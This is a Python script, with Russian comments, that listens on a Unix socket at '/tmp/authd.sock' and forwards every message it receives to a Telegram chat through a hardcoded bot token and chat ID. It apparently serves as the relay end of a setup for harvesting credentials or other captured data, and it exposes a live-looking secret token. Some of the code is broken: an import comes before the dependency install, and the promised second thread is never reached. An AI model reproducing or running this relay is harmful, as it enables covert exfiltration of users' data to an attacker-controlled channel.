import os
import subprocess
import socket
import sys

# Автоматическая установка зависимостей
def install_dependencies():
    try:
        import requests
    except ImportError:
        print("Installing required modules...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
import requests
# Настройки для Telegram
TELEGRAM_TOKEN = '7330744500:AAHe_rHmqnh3Xcb7ZTieL22OoxWBHV7XFqc'
CHAT_ID = '-1002403648422'  # Ваш чат ID

# Функция для отправки сообщений в Telegram с использованием requests
def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    response = requests.post(url, data=data)
    if response.status_code != 200:
        print(f"Failed to send message: {response.status_code}, {response.text}")

# Путь к сокету
SOCKET_PATH = "/tmp/authd.sock"

# Функция для прослушивания сокета и отправки данных в Telegram
def listen_socket():
    sock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
    sock.bind(SOCKET_PATH)

    print("Started listening on socket...")
    while True:
        data = sock.recv(1024)  # Читаем данные из сокета
        if data:
            # Форматируем данные с блоком кода
            message = f"**Received Data:**\n\n```{data.decode('utf-8')}```"
            send_to_telegram(message)

# Функция для завершения работы скрипта по команде 'exit'
def listen_for_exit():
    while True:
        user_input = input("Type 'exit' to stop the script: ")
        if user_input.lower() == "exit":
            print("Exiting...")
            exit()

# Основная функция
def main():
    install_dependencies()  # Установка зависимостей

    # Запускаем два потока:
    # 1. Для прослушивания сокета.
    # 2. Для получения команды 'exit' из консоли.
    listen_socket()
    listen_for_exit()

if __name__ == "__main__":
    main()
